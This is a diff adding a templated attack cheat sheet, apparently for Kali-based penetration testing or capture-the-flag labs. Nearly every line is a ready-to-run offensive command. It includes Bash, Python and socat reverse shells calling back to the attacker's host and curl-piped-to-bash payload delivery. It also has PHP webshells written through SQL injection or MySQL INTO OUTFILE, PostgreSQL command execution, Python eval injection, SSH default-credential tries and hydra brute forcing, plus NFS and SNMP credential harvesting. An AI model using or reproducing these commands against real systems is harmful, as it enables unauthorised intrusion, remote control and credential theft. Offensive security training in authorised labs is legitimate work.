@@ -1,0 +1,55 @@
+# === REVERSE SHELL ONE-LINERS ===
+# Kali listener first
+rlwrap nc -nvlp {{KALI_PORT}}
+# Bash TCP
+bash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1
+# Bash via curl (most reliable for webshells)
+curl http://{{KALI}}:{{KALI_PORT}}/shell.sh | bash
+# Serve shell.sh from Kali
+printf '#!/bin/bash\nbash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1\n' > /tmp/shell.sh && python3 -m http.server {{KALI_PORT}}
+# Python3
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{KALI}}",{{KALI_PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+# Socat (best TTY - if available on target)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{KALI}}:{{KALI_PORT}}
+
+# === WEB: WEBSHELL DELIVERY (ports 80/443/8080/8443) ===
+# Trigger webshell via URL
+curl "http://{{TARGET}}/shell.php?cmd=curl+http://{{KALI}}:{{KALI_PORT}}/shell.sh|bash"
+# Common webshell locations to try
+curl "http://{{TARGET}}/uploads/shell.php?cmd=id"
+curl "http://{{TARGET}}/shell.php?cmd=id"
+# PHP webshell (upload via file upload vuln or write via SQLi)
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# === WEB: SQLI TO SHELL (ports 80/443/8080/8443) ===
+# MySQL - write webshell if FILE privilege and writable web root
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+# PostgreSQL - COPY FROM PROGRAM
+COPY cmd FROM PROGRAM 'bash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1';
+
+# === WEB: PYTHON EVAL/EXEC RCE ===
+curl -X POST http://{{TARGET}}/endpoint -d 'code=__import__("os").popen("id").read()'
+curl -X POST http://{{TARGET}}/endpoint --data-urlencode 'code=__import__("os").system("bash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1")'
+
+# === SSH: CREDENTIAL / KEY REUSE (port 22) ===
+ssh {{USER}}@{{TARGET}}
+ssh -i {{KEY_FILE}} {{USER}}@{{TARGET}}
+# Default credentials to try
+ssh root@{{TARGET}}
+ssh admin@{{TARGET}}
+# Brute force
+hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt {{TARGET}} -t 4 ssh
+
+# === NFS: DIRECT MOUNT (port 2049) ===
+showmount -e {{TARGET}}
+mkdir /tmp/nfs && mount -t nfs -o vers=4 {{TARGET}}:/ /tmp/nfs
+# Check for SSH keys, readable files, writable locations
+
+# === SNMP: CONFIG DISCLOSURE (port 161) ===
+# Often leaks credentials or config details leading to foothold
+snmpwalk -c public -v1 {{TARGET}} | grep -iE "pass|cred|user|key|secret"
+snmpwalk -v1 -c public {{TARGET}} NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+
+# === MYSQL: FILE WRITE TO SHELL (port 3306) ===
+mysql -h {{TARGET}} -u root -p
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
